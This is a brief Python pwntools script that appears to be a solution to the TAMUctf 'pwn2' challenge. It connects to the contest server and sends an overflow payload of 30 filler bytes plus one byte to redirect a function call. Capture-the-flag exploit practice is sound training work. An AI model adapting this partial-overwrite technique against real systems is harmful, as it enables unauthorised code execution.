from pwn import *

#p = process('./pwn2')
p=remote("pwn.tamuctf.com",4322)
#gdb.attach(p)

p.recvuntil('Which function would you like to call?')
print '1'
payload='a'*30+'\xd8'
p.sendline(payload)

a=p.recvall()
print a
#p.interactive()